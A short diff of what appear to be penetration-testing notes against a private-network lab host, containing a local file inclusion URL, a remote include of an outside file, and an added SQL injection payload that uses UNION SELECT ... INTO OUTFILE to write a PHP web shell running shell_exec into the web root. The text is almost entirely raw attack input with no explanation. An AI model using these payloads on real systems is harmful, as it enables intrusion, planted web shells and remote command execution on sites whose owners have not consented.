@@ -1,3 +1,7 @@
 http://192.168.56.101/products.php?type=1&lang=header.php
 
 include 'https://file-examples-com.github.io/uploads/2017/02/file_example_CSV_5000.csv'
+
+union SELECT 1,2,3,“<? php shell_exec('ls'); ?>”,5 INTO OUTFILE “../../../../../../var/www/html/ls.php”
+
+UNION SELECT 1, 2, 3, 4, 5 INTO OUTFILE ""
